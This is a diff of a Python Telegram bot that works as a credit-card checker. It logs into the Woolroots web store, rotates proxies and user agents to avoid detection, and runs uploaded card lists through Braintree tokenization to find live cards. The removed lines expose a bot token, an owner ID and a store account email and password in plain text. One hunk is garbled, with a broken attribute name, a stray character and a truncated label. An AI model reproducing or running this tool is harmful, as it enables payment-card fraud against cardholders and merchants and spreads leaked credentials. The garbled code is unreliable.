@@ -1,10 +1,7 @@
 """
 Woolroots Braintree Checker v6 — Proxy Auto-Rotate
 Owner: @DarkCarder05
-• Auto-rotates proxy every card
-• Auto-rotates User-Agent every request
-• Retries on proxy fail with next proxy (3 attempts)
-• Premium TON emoji UI
+Railway-ready: env vars for secrets
 """
 import os, re, time, base64, random, uuid, threading, logging, itertools
 from threading import Lock
@@ -17,11 +14,11 @@ logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=lo
 logger = logging.getLogger("wool")
 
 # ═══════════════════════════════════════════════════════════
-# CONFIG
+# CONFIG — Railway env vars se aayega
 # ═══════════════════════════════════════════════════════════
-BOT_TOKEN   = "8031306974:AAGj-WcGWWeapvJO1VjQf6zp_cqNSjyiBHs"
-OWNER_ID    = 7077294261
-OWNER_TAG   = "@whoh4sh"
+BOT_TOKEN   = os.getenv("BOT_TOKEN", "")
+OWNER_ID    = int(os.getenv("OWNER_ID", "0"))
+OWNER_TAG   = "@DarkCarder05"
 BOT_NAME    = "TON B3 CHECKER"
 
 SITE        = "https://www.woolroots.com"
@@ -30,19 +27,18 @@ ADD_PM_URL  = f"{SITE}/my-account/add-payment-method/"
 AJAX_URL    = f"{SITE}/wp-admin/admin-ajax.php"
 BT_GRAPHQL  = "https://payments.braintree-api.com/graphql"
 
-LOGIN_USER  = "lagxd71@gmail.com"
-LOGIN_PASS  = "90901212Aa@"
+LOGIN_USER  = os.getenv("LOGIN_USER", "")
+LOGIN_PASS  = os.getenv("LOGIN_PASS", "")
 
 DELAY_MIN = 3
 DELAY_MAX = 7
 PROXY_MAX_RETRIES = 3
 
 # ═══════════════════════════════════════════════════════════
-# PROXY POOL
+# PROXY POOL — env vars se creds
 # ═══════════════════════════════════════════════════════════
-# Agar provider username/password chahiye, yahan daal:
-PROXY_USER = ""       # e.g. "youruser"
-PROXY_PASS = ""       # e.g. "yourpass"
+PROXY_USER = os.getenv("PROXY_USER", "")
+PROXY_PASS = os.getenv("PROXY_PASS", "")
 
 RAW_HOSTS = [
     "px241104.pointtoserver.com:10780",
@@ -66,12 +62,10 @@ def _build_proxies():
     return out
 
 PROXIES = _build_proxies()
-
 _proxy_cycle = itertools.cycle(PROXIES) if PROXIES else None
 _proxy_lock = Lock()
 
 def next_proxy():
-    """Round-robin proxy rotation."""
     if not _proxy_cycle: return None
     with _proxy_lock:
         return next(_proxy_cycle)
@@ -82,7 +76,6 @@ def proxy_dict(p):
 
 def masked_proxy(p):
     if not p: return "DIRECT"
-    # hide credentials if present
     if "@" in p:
         return p.split("@")[-1]
     return p.replace("http://", "").replace("https://", "")
@@ -274,7 +267,6 @@ def ensure_clean_slate(session):
 # CORE — with proxy retry
 # ═══════════════════════════════════════════════════════════
 def check_card(line):
-    """Wrapper with retry on proxy failure."""
     parsed = parse_card(line)
     if not parsed:
         return {"status": "error", "response": "INVALID_FORMAT", "card": line,
@@ -290,7 +282,7 @@ def check_card(line):
         last_result = r
         logger.warning(f"proxy attempt {attempt} failed, retrying...")
         time.sleep(1.5)
-    # all attempts failed
+
     last_result["status"] = "error"
     last_result["response"] = "ALL_PROXIES_FAILED"
     return last_result
@@ -366,7 +358,6 @@ def _attempt_check(parsed, proxy):
                 "options": {"validate": False}}},
             "operationName": "TokenizeCreditCard",
         }
-        # Braintree through same proxy + fresh UA
         r = requests.post(BT_GRAPHQL, headers=bt_headers, json=payload,
                           proxies=proxies, timeout=30)
         try: j = r.json()
@@ -453,7 +444,6 @@ def _attempt_check(parsed, proxy):
 
     except (requests.exceptions.ProxyError,
             requests.exceptions.ConnectionError) as pe:
-        # proxy dead — signal retry
         return {"status": "proxy_dead", "response": f"PROXY_DEAD: {str(pe)[:40]}",
                 "card": cc, "bin": "-", "bank": "-", "country": "-",
                 "deleted": None, "delete_msg": "",
@@ -625,9 +615,9 @@ def cmd_chk(msg):
         f"{e('fire')} <b>╔══════════════════════════╗</b> {e('fire')}\n"
         f"<b>   {bold('STARTING CHECK')}   </b>\n"
         f"{e('bolt')} <b>╚══════════════════════════╝</b> {e('bolt')}\n\n"
-        f"{e('pin')} <b>File</b> ➤ <code>{doc.file_name}</code>\n"
-        f"{e('cash')} <b>Cards</b> ➤ <code>{len(parsed)}</code>\n"
-        f"{e('shield')} <b>Proxies</b> ➤ <code>{len(PROXIES)}</code>\n\n"
+        f"{e('pin')} <b>File</b> ➤ <code>{doc.filePro_name}</code>\n"
+       x f"{e('cash')} <b>Cards</b> ➤ <code>{len(parsed)}</code>\n"
+        f"{e('shield')} <b>ies</b> ➤ <code>{len(PROXIES)}</code>\n\n"
         f"<i>Rotating every card {e('reload')}</i>")
     threading.Thread(target=run_check, args=(msg.chat.id, parsed, msg.from_user.id),
                      daemon=True).start()
@@ -798,6 +788,13 @@ def on_cb(c):
 # MAIN
 # ═══════════════════════════════════════════════════════════
 if __name__ == "__main__":
+    # Validate env vars
+    if not BOT_TOKEN:
+        print("❌ BOT_TOKEN missing! Set env var.")
+        exit(1)
+    if not LOGIN_USER or not LOGIN_PASS:
+        print("⚠️  LOGIN_USER / LOGIN_PASS missing — login will fail")
+
     print(f"🚀 {BOT_NAME} starting…")
     print(f"🛡 Proxies loaded: {len(PROXIES)}")
     for p in PROXIES:
